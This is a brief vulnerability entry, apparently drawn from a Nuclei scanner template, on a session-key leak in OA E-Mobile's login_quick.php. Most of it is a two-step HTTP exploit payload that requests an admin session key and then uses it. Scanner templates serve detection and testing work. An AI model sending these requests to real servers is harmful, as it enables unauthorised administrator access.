# Vulnerability: OA E-Mobile login_quick.php - Login SessionKey
**Classification:** WEAVER
**Source:** Nuclei Template (`weaver-login-sessionkey.yaml`)

## Description
login_quick.php in OA E-Mobile leaks session key.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /E-mobile/App/System/Login/login_quick.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

identifier=admin

GET /E-mobile/App/Init.php?m=all_Create&detailid=&fromid=&sessionkey={{timestamp}} HTTP/1.1
Host: {{Hostname}}
```

